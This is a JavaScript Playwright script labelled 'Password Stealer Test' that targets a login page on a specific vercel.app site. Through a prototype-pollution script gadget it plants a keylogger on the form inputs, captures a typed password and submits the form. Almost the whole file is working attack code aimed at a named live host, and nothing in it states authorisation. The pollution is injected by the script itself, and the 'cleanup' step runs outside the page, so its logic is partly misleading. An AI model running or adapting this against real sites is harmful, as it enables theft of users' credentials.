const { chromium } = require('playwright');

(async () => {
    console.log("=== Password Stealer Test ===");
    
    const browser = await chromium.launch({ headless: true });
    const context = await browser.newContext();
    const page = await context.newPage();
    
    // Collect console messages
    page.on('console', msg => console.log('BROWSER:', msg.text()));
    
    // Navigate to target
    await page.goto('https://sturdy-octo-memory-three.vercel.app/login');
    await page.waitForTimeout(2000);
    
    // Get all inputs
    const inputs = await page.evaluate(() => {
        return [...document.querySelectorAll('input')].map(i => ({
            type: i.type,
            name: i.name,
            placeholder: i.placeholder,
            id: i.id
        }));
    });
    console.log("Found inputs:", JSON.stringify(inputs));
    
    // Plant keylogger via XSS
    console.log("\nPlanting keylogger via PP XSS...");
    const xssResult = await page.evaluate(() => {
        return new Promise((resolve) => {
            window.alertCalled = false;
            window.stolenData = [];
            window.alert = (msg) => {
                window.alertCalled = true;
                window.stolenData.push(msg);
            };
            
            // Pollute children
            Object.prototype.children = "document.querySelectorAll('input').forEach(i => { i.addEventListener('input', e => { window.stolenData.push(e.target.value); }); })";
            
            // Trigger gadget
            let o = document.createElement("script");
            let r = {};
            o.innerHTML = r.children;
            document.head.appendChild(o);
            
            setTimeout(() => resolve("Keylogger planted"), 1000);
        });
    });
    console.log(xssResult);
    
    // Type in the password field
    console.log("\nTyping password...");
    await page.locator('input').first().fill('SuperSecretPassword123!');
    await page.waitForTimeout(500);
    
    // Check stolen data
    const stolenData = await page.evaluate(() => window.stolenData);
    console.log("Stolen data:", stolenData);
    
    // Try to submit the form and see what happens
    console.log("\nSubmitting form...");
    await page.click('button[type=submit]');
    await page.waitForTimeout(2000);
    
    // Check where we ended up
    const finalUrl = page.url();
    console.log("Final URL:", finalUrl);
    
    // Get page content
    const bodyText = await page.evaluate(() => document.body.innerText.substring(0, 500));
    console.log("Page text:", bodyText);
    
    await browser.close();
    
    // Cleanup: Remove polluted properties
    delete Object.prototype.children;
    
    console.log("\n=== Test Complete ===");
})();
